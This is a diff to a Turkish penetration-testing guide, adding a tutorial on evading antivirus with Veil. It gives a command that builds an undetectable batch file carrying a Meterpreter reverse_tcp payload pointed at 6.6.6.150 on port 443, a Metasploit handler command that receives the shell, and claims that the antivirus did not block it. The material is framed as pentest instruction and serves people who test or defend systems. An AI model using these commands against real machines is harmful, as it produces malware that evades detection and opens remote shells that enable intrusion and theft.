@@ -26,11 +26,46 @@ __Sezgisel (heuristic)__
 
 * Zararlıyı, sezgisel ve gerçek zamanlı davranış analizi yaparak tespit etmeye çalışır.
 
-Bu çalışma, metasploit framework projesinde bulunan farklı encoderları kullanarak meterpreter içeriğini antivirusler tarafından tanınmaz yapıp, ayrıca masum bir uygulama imajı kazandırmak üzere bir kaç satır kod eklemektedir.
+#### Veil kullanarak Sızma Testlerinde Antivirüs Atlatma 
 
+Penetrasyon testlerinde sıklıkla antivirus uygulamalarının atlatılması ihtiyacı doğmaktadır. Çeşitli encoding yöntemleri kullanılarak antivirus yazılımları atlatılabilmektedir. Msfpayload, Msfencode, Msfvenom benzeri yazılımlar ile istenilen özelliklerde zararlı yazılım üretmek mümkündür. Aşağıda bunlara alternatif ve oldukça başarılı bir uygulama olan VEIL ile bu işlemin nasıl gerçekleştirilebileceğine değinilmiştir.
 
+Windows işletim sistemleri üzerinde çalışan antiviruslere yakalanmayan batch file oluşturmak için aşağıda ki ilgili komutları çalıştırması yeterlidir. 6.6.6.150 ipsine 443 portu üzerinden reverse bağlantı kurarak erişim sağlanacaktır.
+
+Öncelikle aşağıdaki komut kullanılarak batch file oluşturulabilir. İlgili komut çalıştırıldıktan sonra .bat uzantılı zararlı uygulamamız oluşmuş olacaktır.
+
+```ShellSession
+root@kali:#  veil -l powershell -p VirtualAlloc -o undetectable --msfpayload windows/meterpreter/reverse_tcp --msfoptions LHOST=6.6.6.150 LPORT=443
+```
+
+![ANTIVIRUS](../resim/ataklar/antivirus/1.png)
+
+![ANTIVIRUS](../resim/ataklar/antivirus/2.png)
+
+Windows üzerinde batch dosyasını çalıştırmadan önce lokal makinamızda 443 portu metasploit ile dinleme moduna alıyoruz.
+
+Aşağıdaki komut ile  443 portunun dinleme moduna alınması sağlanmıştır. Payload olarak reverse_tcp kullanılmıştır.
+
+```ShellSession
+root@kali:#  msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=6.6.6.150 LPORT=443 E
+```
+
+![ANTIVIRUS](../resim/ataklar/antivirus/3.png)
+
+Windows üzerinde undetectable.bat dosyamızı çalıştırıyoruz. Çalıştırmamızla birlikle meterpreter shell bizi karşılıyor.
+
+![ANTIVIRUS](../resim/ataklar/antivirus/4.png)
+
+Zararlının çalıştırıldığı sistem üzerindeki antivirüsün zararlıyla ilgili herhangi bir bloklama işlemi gerçekleştirmediği aşağıda görülebilmektedir.
+
+![ANTIVIRUS](../resim/ataklar/antivirus/5.png)
+
+Bu şekilde antivirüs atlatılarak mevcut sisteme en üst seviyede erişim sağlanmış olacaktır. 
+
+[KAYNAK](http://blog.bga.com.tr/2014/02/veil-kullanarak-szma-testlerinde.html)
 
 ##### DAHA FAZLASI İÇİN
 
 * [Antivirüs Programları Nasıl Çalışır?](http://www.elektrikport.com/teknik-kutuphane/antivirus-programlari-nasil-calisir/11475)
 * [Kendi Backdoor'unuzu Oluşturun](http://onuraktas.net/kendi-backdoorunuzu-olusturun/)
+* [Antivirüs Atlatma(Bypass)](https://www.youtube.com/watch?v=jGbV9c26N5k)
